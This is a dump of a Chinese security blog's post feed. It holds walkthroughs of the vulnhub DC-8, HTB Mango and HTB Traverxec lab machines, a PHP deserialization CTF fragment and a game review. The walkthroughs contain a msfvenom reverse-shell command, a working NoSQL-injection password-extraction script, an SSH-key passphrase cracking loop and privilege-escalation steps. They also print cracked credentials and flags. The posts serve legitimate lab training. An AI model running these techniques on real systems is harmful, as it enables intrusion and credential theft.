class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  &#39;user&#39; &#x3D;&gt;</span><br><span class="line">  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;</span><br><span class="line">  &#39;img&#39; &#x3D;&gt;</span><br><span class="line">  string(20) &quot;ZDBnM19mMWFnLnBocAo&#x3D;&quot;</span><br><span class="line">  &#39;dd&#39; &#x3D;&gt;</span><br><span class="line">  string(3) &quot;aaa&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到成功地覆盖了img属性</p><p>ps,又测试了一下如果有两个img属性会怎么搞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'user'</span>] = <span class="string">'flagflagflagflagflagflag'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocAo=";s:3:"img";s:3:"aaa";&#125;'</span>;</span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = <span class="string">'Z3Vlc3RfaW1nLnBuZwo='</span>;</span><br></pre></td></tr></table></figure><p>得到的结果是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">'user'</span> =&gt;</span><br><span class="line">  string(<span class="number">24</span>) <span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">62</span>:<span class="string">"a"</span></span><br><span class="line">  <span class="string">'img'</span> =&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">"aaa"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时img属性被合并了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文明六玩后感</title>
      <link href="/posts/61b7ba22/"/>
      <url>/posts/61b7ba22/</url>
      
        <content type="html"><![CDATA[<p>完了一段的时间的文明六，（虽然才48个小时</p><p><img src= "/img/loading.gif" data-src="/posts/61b7ba22/1583294758274.png" alt></p><h2 id="总体感觉"><a href="#总体感觉" class="headerlink" title="总体感觉"></a>总体感觉</h2><p>一开始玩这个游戏有点不知所措，因为这个游戏的信息量实在是太大了，后来慢慢地从别人的视频中才逐渐的熟悉起来。</p><p>文明六大概分为几个部分吧，首先是最基本的城市，可以建造区域，练兵，造工人，开拓者。然后是</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-DC-8</title>
      <link href="/posts/24a0544e/"/>
      <url>/posts/24a0544e/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80&#x2F;tcp open  ssl&#x2F;http Apache</span><br><span class="line">|_http-generator: Drupal 7 (http:&#x2F;&#x2F;drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| &#x2F;includes&#x2F; &#x2F;misc&#x2F; &#x2F;modules&#x2F; &#x2F;profiles&#x2F; &#x2F;scripts&#x2F; </span><br><span class="line">| &#x2F;themes&#x2F; &#x2F;CHANGELOG.txt &#x2F;cron.php &#x2F;INSTALL.mysql.txt </span><br><span class="line">| &#x2F;INSTALL.pgsql.txt &#x2F;INSTALL.sqlite.txt &#x2F;install.php &#x2F;INSTALL.txt </span><br><span class="line">|_&#x2F;LICENSE.txt &#x2F;MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br><span class="line">MAC Address: 08:00:27:A8:B6:73 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>打开80端口发现是drupal,扫描到后台 <a href="http://192.168.56.102/user" target="_blank" rel="noopener">http://192.168.56.102/user</a> ，并且发现了可疑注入点</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583216887452.png" alt></p><p>sqlmap注入</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217015158.png" alt></p><p>得到用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>不过密码是hash过的，使用john爆破，只有 <code>john</code> 用户的密码可以爆破出来 <code>turtle</code></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>修改页面</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217110935.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.56.1 lport&#x3D;4444 -f raw  -o shell.php</span><br></pre></td></tr></table></figure><p>生成 shell ，修改</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217170125.png" alt></p><p>修改完之后，提交表单</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217222343.png" alt></p><p>成功getshell</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217261982.png" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 SUID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:&#x2F;tmp$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null </span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null                     </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                             </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                          </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                             </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                           </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                             </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                           </span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4                                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                         </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper               </span><br><span class="line">&#x2F;bin&#x2F;ping                                                 </span><br><span class="line">&#x2F;bin&#x2F;su                                                   </span><br><span class="line">&#x2F;bin&#x2F;umount                                               </span><br><span class="line">&#x2F;bin&#x2F;mount</span><br></pre></td></tr></table></figure><p>发现了 <code>exim4</code> ,这是一个邮件程序</p><p>搜索相关的 exploit</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217430342.png" alt></p><p>将 <code>46996.sh</code> 上传到靶机上，注意需要修改一下文件格式为 <code>unix</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ff&#x3D;unix</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217742979.png" alt></p><p>最后得到flag</p><p><img src= "/img/loading.gif" data-src="/posts/24a0544e/1583217755873.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB mango靶机实战</title>
      <link href="/posts/73230382/"/>
      <url>/posts/73230382/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">staging-order.mango.htb</span><br></pre></td></tr></table></figure><p>访问网站</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://staging-order.mango.htb/index.php"</span>  </span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Host"</span>: <span class="string">"staging-order.mango.htb"</span>&#125;  </span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"9k6j39np56td4vq3q4lg4eh95j"</span>&#125;  </span><br><span class="line"></span><br><span class="line">possible_chars = list(string.ascii_letters) + list(string.digits) + [<span class="string">"\\"</span>+c <span class="keyword">for</span> c <span class="keyword">in</span> string.punctuation+string.whitespace ]  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span><span class="params">(username)</span>:</span>  </span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Extracting password of "</span> + username)  </span><br><span class="line"></span><br><span class="line">    params = &#123;<span class="string">"username"</span>:username, <span class="string">"password[$regex]"</span>:<span class="string">""</span>, <span class="string">"login"</span>: <span class="string">"login"</span>&#125;  </span><br><span class="line"></span><br><span class="line">    password = <span class="string">"^"</span>  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> possible_chars:  </span><br><span class="line"></span><br><span class="line">            params[<span class="string">"password[$regex]"</span>] = password + c + <span class="string">".*"</span>  </span><br><span class="line"></span><br><span class="line">            pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=<span class="literal">False</span>)  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> int(pr.status_code) == <span class="number">302</span>:  </span><br><span class="line"></span><br><span class="line">                password += c  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c == possible_chars[<span class="number">-1</span>]:  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"Found password "</span>+password[<span class="number">1</span>:].replace(<span class="string">"\\"</span>, <span class="string">""</span>)+<span class="string">" for username "</span>+username)  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> password[<span class="number">1</span>:].replace(<span class="string">"\\"</span>, <span class="string">""</span>)  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_usernames</span><span class="params">()</span>:</span>  </span><br><span class="line"></span><br><span class="line">    usernames = []  </span><br><span class="line"></span><br><span class="line">    params = &#123;<span class="string">"username[$regex]"</span>:<span class="string">""</span>, <span class="string">"password[$regex]"</span>:<span class="string">".*"</span>, <span class="string">"login"</span>: <span class="string">"login"</span>&#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> possible_chars:  </span><br><span class="line"></span><br><span class="line">        username = <span class="string">"^"</span> + c  </span><br><span class="line"></span><br><span class="line">        params[<span class="string">"username[$regex]"</span>] = username + <span class="string">".*"</span>  </span><br><span class="line"></span><br><span class="line">        pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=<span class="literal">False</span>)  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> int(pr.status_code) == <span class="number">302</span>:  </span><br><span class="line"></span><br><span class="line">            print(<span class="string">"Found username starting with "</span>+c)  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> c2 <span class="keyword">in</span> possible_chars:  </span><br><span class="line"></span><br><span class="line">                    params[<span class="string">"username[$regex]"</span>] = username + c2 + <span class="string">".*"</span>  </span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=<span class="literal">False</span>).status_code) == <span class="number">302</span>:  </span><br><span class="line"></span><br><span class="line">                        username += c2  </span><br><span class="line"></span><br><span class="line">                        print(username)  </span><br><span class="line"></span><br><span class="line">                        <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> c2 == possible_chars[<span class="number">-1</span>]:  </span><br><span class="line"></span><br><span class="line">                    print(<span class="string">"Found username: "</span> +username[<span class="number">1</span>:])  </span><br><span class="line"></span><br><span class="line">                    usernames.append(username[<span class="number">1</span>:])  </span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> usernames  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> get_usernames():  </span><br><span class="line"></span><br><span class="line">    get_password(u)</span><br></pre></td></tr></table></figure><p>爆出密码</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967279320.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Found username: mango</span><br><span class="line">Extracting password of admin</span><br><span class="line">Found password t9KcS3&gt;!0B#2 for username admin</span><br><span class="line">Extracting password of mango</span><br><span class="line">Found password h3mXK8RhU~f&#123;]f5H for username mango</span><br></pre></td></tr></table></figure><p>使用mango用户登陆</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967301413.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">userflag</span><br><span class="line"></span><br><span class="line">$ cat user.txt</span><br><span class="line">79bf31c6c6eb38a8567832f7f8b47e92</span><br></pre></td></tr></table></figure><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967336806.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>寻找SUID</p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src= "/img/loading.gif" data-src="/posts/73230382/1582967372531.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; var BufferedReader = Java.type(<span class="string">"java.io.BufferedReader"</span>);</span><br><span class="line">jjs&gt; var FileReader = Java.type(<span class="string">"java.io.FIleReader"</span>);</span><br><span class="line">java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReader</span><br><span class="line">jjs&gt; var FileReader = Java.type(<span class="string">"java.io.FileReader"</span>);</span><br><span class="line">jjs&gt; var br = new BufferedReader(new FileReader(<span class="string">"/root/root.txt"</span>));</span><br><span class="line">jjs&gt; <span class="keyword">while</span>((line=br.readline())!=null)&#123;<span class="built_in">print</span>(line);&#125;</span><br><span class="line">&lt;shell&gt;:1 TypeError: br.readline is not a <span class="keyword">function</span></span><br><span class="line">jjs&gt; <span class="keyword">while</span>((line=br.readLine())!=null)&#123;<span class="built_in">print</span>(line);&#125;</span><br><span class="line">8a8ef79a7a2fbb01ea81688424e9ab15</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Traverxec靶机实战</title>
      <link href="/posts/d5bfc2a3/"/>
      <url>/posts/d5bfc2a3/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;&#x2F;dev&#x2F;null; then echo $pass; break; fi; done</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966848699.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line">7db0b48469606a42cec20750d9782f3d</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ cat server-stats.head                                           </span><br><span class="line">                                                                          .----.       </span><br><span class="line">                                                              .---------. | == |       </span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">""</span><span class="string">""</span><span class="string">"-.| |----|       </span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |       </span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|       </span></span><br><span class="line"><span class="string">                                                              |'-.....-'| |::::|       </span></span><br><span class="line"><span class="string">                                                              '"</span><span class="string">")---("</span><span class="string">"' |___.|       </span></span><br><span class="line"><span class="string">                                                             /:::::::::::\"    "</span>       </span><br><span class="line">                                                            /:::=======:::\            </span><br><span class="line">                                                        jgs <span class="string">'"""""""""""""'</span>            </span><br><span class="line">                                                                                       </span><br><span class="line">david@traverxec:~/bin$ cat server-stats.sh                                             </span><br><span class="line"><span class="meta">#!/bin/bash                                                                            </span></span><br><span class="line">                                                                                       </span><br><span class="line">cat /home/david/bin/server-stats.head                                                  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Load: `/usr/bin/uptime`"</span>                                                         </span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span>                                                                               </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"</span>               </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"</span>    </span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span>                                                                               </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Last 5 journal log lines:"</span>                                                       </span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat</span><br></pre></td></tr></table></figure><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-最长回文字串</title>
      <link href="/posts/a99288c/"/>
      <url>/posts/a99288c/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-Connectthedots</title>
      <link href="/posts/e4ff8385/"/>
      <url>/posts/e4ff8385/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机渗透-Connectthedots"><a href="#vulnhub靶机渗透-Connectthedots" class="headerlink" title="vulnhub靶机渗透-Connectthedots"></a>vulnhub靶机渗透-Connectthedots</h1><blockquote><p>这个靶机比较脑洞，但是最后的提权过程挺有意思的。</p></blockquote><p>目标：/home/user.txt and /root/root.txt</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>由于VMware会出现种种问题，于是改成了Virtual Box,而且Vulhub上的大部分靶机都是使用Virtual Box制作的</p><p>附上一些相关的配置截图：</p><p>kali 2019.04<br>第一块网卡没做修改</p><p>添加了第二块网卡<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576475770757.png" alt></p><p>vulnhub靶机渗透-Connectthedots作为靶机，同样添加了第二块网卡</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali IP ： 192.168.99.101<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576475827530.png" alt></p><p>通过nmap发现另一台主机(注意netdiscover和arp-scan都无法使用了)<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576475870118.png" alt></p><p>主机开放的所有服务：</p><p><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576476412907.png" alt></p><p>一个个来看</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>vsftp 服务， metasploit搜索payload</p><p>返回的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 